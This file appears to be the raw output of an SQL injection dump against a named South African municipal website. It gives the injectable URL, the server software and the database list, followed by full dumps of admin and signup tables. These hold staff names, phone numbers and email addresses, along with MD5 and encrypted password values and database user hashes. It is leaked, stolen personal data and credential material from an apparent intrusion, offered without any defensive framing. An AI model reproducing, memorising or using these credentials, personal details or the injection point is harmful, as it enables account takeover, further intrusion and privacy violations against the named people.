@@ -1,0 +1,236 @@
+.gov Government
+
+.za South Africa (Zuid Africa)
+
+Buffalo City Metropolitan Municipality
+
+https://www.buffalocitymetro.gov.za/speech.php?id=5
+
+the back-end DBMS is MySQL
+web server operating system: Windows 10 or 2019 or 2016
+web application technology: Microsoft IIS 10.0, PHP 5.6.40
+the back-end DBMS: MySQL >= 5.0.12
+banner: '5.7.32'
+
+available databases [6]:
+[+] buffaloc_projectt_bcmapp
+[+] freshproduce
+[+] information_schema
+[+] mysql
+[+] performance_schema
+[+] sys
+
+database management system users password hashes:
+[*] azure_superuser [1]:
+    password hash: NULL
+[*] BCMMwebadmin01 [1]:
+    password hash: *E49F69A7FCBAF0B19823D2F7BE911E20A5D1FE7C
+[*] mysql.session [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[*] mysql.sys [1]:
+    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+
+Database: buffaloc_projectt_bcmapp
+[65 tables]
++--------------------------+
+| about_bcmm               |
+| activity_log             |
+| additional_user_accounts |
+| admin                    |
+| awarded_tenders          |
+| business                 |
+| chat_box                 |
+| contact_details          |
+| contact_us               |
+| customer_care            |
+| departments              |
+| directorates             |
+| emergencies              |
+| eservices                |
+| events                   |
+| executive_mayor          |
+| failed_login             |
+| faqs                     |
+| fault_departments        |
+| feedback                 |
+| files                    |
+| folder                   |
+| fraud_hotline            |
+| gallery                  |
+| idp_input                |
+| incidents                |
+| mayor_mandate            |
+| mayor_profile            |
+| mc                       |
+| media_contacts           |
+| media_statements         |
+| mpac                     |
+| news                     |
+| newsletters              |
+| notifications            |
+| opportunities_bursaries  |
+| password_change_requests |
+| people                   |
+| pr                       |
+| privacy                  |
+| public_notices           |
+| query_reply              |
+| ref_chat_box             |
+| ref_generator            |
+| ref_table                |
+| residents                |
+| resource_documents       |
+| scroll_videos            |
+| service_departments      |
+| signup                   |
+| speeches                 |
+| subfolder                |
+| survey_answer_options    |
+| survey_answers           |
+| survey_questions         |
+| surveys                  |
+| tender_openings          |
+| tenders                  |
+| terms                    |
+| user_accounts            |
+| users                    |
+| vacancies                |
+| ward                     |
+| ward_emails              |
+| web_tv                   |
++--------------------------+
+
+Database: buffaloc_projectt_bcmapp
+Table: admin
+[56 entries]
++-----------------+---------------+-----------------+----------------------------------------+----------------------------------+
+| cell            | name          | surname         | email                                  | password                         |
++-----------------+---------------+-----------------+----------------------------------------+----------------------------------+
+| 0734885979      | BCCM          | Youth           | youth@buffalocity.gov.za               | f389bf446a562d5625aa9ed083bc2c40 |
+| 0415032100      | Electricity   | Incident        | elec@buffalocity.gov.za                | adc6fd396d9292a0427cb0f82f1e3373 |
+| 0437052888      | Khayalethu    | Mayile          | khayalethum@buffalocity.gov.za         | f389bf446a562d5625aa9ed083bc2c40 |
+| 0737013824      | Maile         | Matlokotsi      | mailem@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437059331      | Anathi        | Madikizela      | anathimad@buffalocity.gov.za           | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053000      | Bongani       | Mndi            | bonganimn@buffalocity.gov.za           | c28730abdc9c0c67d3f767bc220d9a04 |
+| 0437611669      | Andile        | Hlangu          | andileh@buffalocity.gov.za             | 66ad9dc39ed02634d8711c7140dcad91 |
+| 0437051015      | Siphiwo       | Konzaphi        | siphiwok@buffalocity.gov.za            | df05869c6f0a6f263c003a638389e9bc |
+| 0437059254      | Moses         | Jalamani        | mosesj@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| N/A             | Nosisa        | Tshika          | nosisats@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053000      | Rutania       | Loots           | rutanial@buffalocity.gov.za            | cb491e248f107c824c12e51ff820b91f |
+| 0726130918      | Masande       | Ndyaluvane      | masanden@buffalocity.gov.za            | 729f7c3193366d9d7bf2b6058512f398 |
+| 000000000       | Change        | Manager         | changem@buffalocity.gov.za             | 8e5e6b14186d056c85d071c118bce849 |
+| 0437053543      | Jabu          | Somgxada        | jabus@buffalocity.gov.za               | 929b05640754cfa37cad1c787642f00d |
+| 0437059223      | Lwanele       | Maselana        | lwanelem@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053784      | Malibongwe    | Mbalo           | malibongwemb@buffalocity.gov.za        | de27bc114584f72ebb502436e6f3a0b3 |
+| 0437059220      | Lundi         | Mkanyelwa       | lundim@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0785835063      | Lonwabo       | Faleni          | lonwabof@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0734885979      | BCCM Incident |  Manager        | incident@buffalocity.gov.za            | b87fd48c46f0552e9a0e93a160d8f21b |
+| 0723188035      | BCMM          | Content Manager | info@buffalocity.gov.za                | dbfe4b12614f31d647795385385c16be |
+| 0437053000      | Abrina        | Du Plessis      | abrinad@buffalocity.gov.za             | f5976d9c684f74c196e0d27de0843e50 |
+| 0723188035      | Daniel        | Smith           | kwasia@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 043Ã‚Â 742 2131 | Sibahle       | Magadla         | sibahle.magadla@designerlighting.co.za | f389bf446a562d5625aa9ed083bc2c40 |
+| 0788200025      | Bantu         | Ralana          | bantur@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052100      | Sylvia        | Nonqayana       | sylvian@buffalocity.gov.za             | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437051015      | Shaun         | Petzer          | shaunpe@buffalocity.gov.za             | 4a23418d184bf4f69e71c860719c5612 |
+| 0437053073      | Garnet        | Laings          | garnetl@buffalocity.gov.za             | f389bf446a562d5625aa9ed083bc2c40 |
+| 0739955786      | Busisiwe      | Mputa           | BusisiweMp@buffalocity.gov.za          | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437059235      | Zanele        | Guma            | zaneleg@buffalocity.gov.za             | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437059901      | Nosiphiwo     | Mana            | nosiphiwomana@buffalocity.gov.za       | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052467      | Helen         | Scheffers       | helens@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052985      | Linda         | Allam           | lindaa@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0815740488      | Frank         | Boateng         | frankb@buffalocity.gov.za              | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052964      | Jane          | Galo            | janeg@buffalocity.gov.za               | f389bf446a562d5625aa9ed083bc2c40 |
+| 0815740488      | Sakhile       | Gwebityala      | sakhileg@buffalocity.gov.za            | 8c1abbb57e6ba2116b448bbe5a6fa885 |
+| 0437059605      | Jean          | Smith           | jeans@buffalocity.gov.za               | f389bf446a562d5625aa9ed083bc2c40 |
+| 0815740488      | Sisanda       | Mbodlela        | sisandam@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053000      | Sitatu        | Nyikana         | sitatun@buffalocity.gov.za             | 50ec07836fe95d73e61985ceb68ad854 |
+| 0437058597      | Howard        | Sikweza         | howards@buffalocity.gov.za             | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052100      | Onke          | Mpulampula      | onkem@buffalocity.gov.za               | 2b2c2b50a899e30d71c24ca797550e7b |
+| 0437053361      | Siphiwo       | Bam             | siphiwob@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437058560      | Yolanda       | Scheepers       | yolandas@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437052943      | Phuthuma      | Konzani         | phuthumak@buffalocity.gov.za           | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053000      | Cassandra     | Ruiters         | cassandrar@buffalocity.gov.za          | 8ad0007230157d00fb3dc10e4ffdceb9 |
+| 0437052845      | Siphokazi     | Singqoto        | siphokazisi@buffalocity.gov.za         | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053730      | Nomphelo      | Dodo            | nomphelodo@buffalocity.gov.za          | 84764eddccdf44a38f2cff6f8d22f99f |
+| 0437052100      | Melanie       | Naidoo          | melanien@buffalocity.gov.za            | 021d277a012749ba0547518c572537e9 |
+| 0437059602      | Rob           | Ferrier         | robf@buffalocity.gov.za                | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437059236      | Thuleka       | Nameko          | thulekan@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437051753      | Tabisa        | Mntengwana      | tabisamn@buffalocity.gov.za            | 89da76842be8e0467e178d4d07dc0a0d |
+| N/A             | Dispatch      | Control Centre  | dispatcher1@buffalocity.gov.za         | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437053080      | Meter         | Reading         | meterreading@buffalocity.gov.za        | f389bf446a562d5625aa9ed083bc2c40 |
+| N/A             | Avuyile       | Benu            | avuyileb@buffalocity.gov.za            | f389bf446a562d5625aa9ed083bc2c40 |
+| 0815740488      | Gershwin      | Botha           | gershwinb@buffalocity.gov.za           | f389bf446a562d5625aa9ed083bc2c40 |
+| 0437059235      | Nana          | Ngxuthu         | nanan@buffalocity.gov.za               | f389bf446a562d5625aa9ed083bc2c40 |
+| N/A             | Lindelwa      | Cebanto         | lindelwac@buffalocity.gov.za           | f389bf446a562d5625aa9ed083bc2c40 |
++-----------------+---------------+-----------------+----------------------------------------+----------------------------------+
+
+Database: buffaloc_projectt_bcmapp
+Table: signup
+[16 entries]
++--------------+------------------------+------------+-------------------------------+--------------------------------------------------------------------------------------+
+| cell         | name                   | surname    | email                         | password                                                                             |
++--------------+------------------------+------------+-------------------------------+--------------------------------------------------------------------------------------+
+| 0782256699   | Anele                  | Mabona     | anelema@buffalocity.gov.za    | QUR2R2Zla0VpWlBtbWg4YUw4WXA5dz09Ojp6CYrpt0HcZsgGi/p+dF82                             |
+| 043 705 3740 | Vusi                   | Loliwe     | vusil@buffalocity.gov.za      | NlpIR3VScHA5cE1qaTRjc0o1ZS9xZz09Ojod1TtJu83+ZgvrlXTSPyw2                             |
+| 3070         | Tembela                | Siswana    | tembelas@buffalocity.gov.za   | ZUhWcEFuL2VLS2swbUY5a3pvVFJIdz09OjpuiptHz9E4ymBnd3Hc/5jX                             |
+| 043 705 1158 | Tabisa                 | Mntengwana | tabisamn@buffalocity.gov.za   | MldTTUJYQSs5L2EyMkRBbHVFaUMzQT09OjoSPAJon0fvoDqb7VpW+Iuw                             |
+| 0437052750   | Melanie                | Naidoo     | melanien@buffalocity.gov.za   | QTdpZTdQcVo5NHJ5YUljY3ZWeVpwZz09OjouhRPQYl9b0tP+z78y4FI6                             |
+| 0437053994   | Sisanda                | Camagu     | sisandac@buffalocity.gov.za   | elE5YTZ4YldRbUxqcTQ0QzVIRGx1dz09OjrZG2pLOJV20yTBzlLk49C5                             |
+| 9296         | Rutania                | Loots      | rutanial@buffalocity.gov.za   | TWNOaHUyNXFiV09KUGNNb1lvV3RFUT09Ojo4Ch7UVJb8VzjJ81LskmOe                             |
+| 1993         | Sivuyile               | Churchill  | sivuyilec@buffalocity.gov.za  | aWJ1YmtjUjBuU2hhOUxJRXc4c1R1QT09Ojo1fj8WRVdt+0+M1v5VdwLZ                             |
+| 0437053121   | Dean                   | Peters     | deanp@buffalocity.gov.za      | YXQ2VHBEWFFqM3ArSTFyWSsxUG9SQT09OjonERHG/wCdxL0XgFLHvCCT                             |
+| 043705 3951  | Chwayita               | Mnqeta     | chwayitamn@buffalocity.gov.za | aTd6TWR2VkxzQjR1bXMxZms2WC8rUVlGcEZNUEJKZEdETVRrTzhuOWZCdz06OuRR0frhfHSn8Op++BAKdf8= |
+| 0437053217   | Sandiswa               | Lindani    | sandiswal@buffalocity.gov.za  | aEJIRXUzM2J4VDJENWlEcGQxck1Wd2NldVNzY3NjMXVLMWgyaGJQZGFLUT06Ok6tqqNvQEcsrqchyNjvlFg= |
+| 0437059286   | Yolanda                | Cwala      | yolandac@buffalocity.gov.za   | SmttUk56b29ic25UT2xUY1VWdmxPdz09OjqmSHNOVNDTvt/DNNPk7yAv                             |
+| 0782256699   | TestUser               | Demo01     | anelema@gmail.com             | RkdvUXl0dWdrWWVtTmtTUzJpRW1tdz09Ojq8CjItD7wEghIz3QW1eXZ8                             |
+| 1121         | Andile                 | Gxoyiya    | andileg@buffalocity.gov.za    | RG1yWGVZanFmeWFzZjdYNkcreGxWdz09OjpiJkvEs7p723gCgRs1TtAE                             |
+| 1121         | Andisiwe               | Xatisa     | andisiwex@buffalocity.gov.za  | b1hmRGJaNWdMRDVxRllrQzV2c1VvQT09OjrJFJW0//1lUDz7S/GmHPVh                             |
+| 3262         | TestUser All Incidents | Demo02     | demo2@gmail.com               | QjdCTzBaNy9WTFBKK2pCNGowSmJHdz09OjocJ2t45uWetU0PMFlMZ+ae                             |
++--------------+------------------------+------------+-------------------------------+--------------------------------------------------------------------------------------+
+
+Database: freshproduce
+[30 tables]
++--------------------------+
+| about_us                 |
+| activity_log             |
+| agents                   |
+| buyers_buying_lost_cards |
+| buyers_buying_process    |
+| comm_market              |
+| contacts                 |
+| csrf                     |
+| faqs                     |
+| gallery                  |
+| hours_work               |
+| hours_work_buyers        |
+| hours_work_producer      |
+| news                     |
+| news_latest              |
+| office_hours_work        |
+| other_services           |
+| partners                 |
+| product_cat              |
+| product_stats            |
+| products                 |
+| products_test            |
+| scroll_videos            |
+| security_safety          |
+| signup                   |
+| slides                   |
+| subject                  |
+| team                     |
+| user_queries             |
+| web_visits               |
++--------------------------+
+
+Database: freshproduce
+Table: signup
+[4 entries]
++---------------+-----------+---------+-------------------------------+----------------------------------------------------------+
+| cell          | name      | surname | email                         | password                                                 |
++---------------+-----------+---------+-------------------------------+----------------------------------------------------------+
+| 0782256699    | Anele     | Mabona  | anelema@gmail.com             | T25KU3pNeXlra0w0QTl5U0I2SlBRZz09OjpUxaEg19ThJxYWzRtW+1iM |
+| 3070          | Tembela   | Siswana | tembelas@buffalocity.gov.za   | SVJvZWNxbUNDakZZaHViOHlRNllCdz09Ojo8xGgWaeVzpRz4/nJrARTx |
+| 0437059500    | Zipho     | Tafane  | ziphot@buffalocity.gov.za     | b1hwTUNMeUltRGU0YXd0RFFsTXpndz09OjphEQAhsxqCQBknwyadHfRv |
+| 043 705  9514 | Khuthazwa | Noqayi  | khuthazwan@buffalocity.gov.za | MGpHUmRiZTdIdDBCM3IrN09HSmtDdz09OjoetgICScmPnFpwGjN3z9XW |
++---------------+-----------+---------+-------------------------------+----------------------------------------------------------+
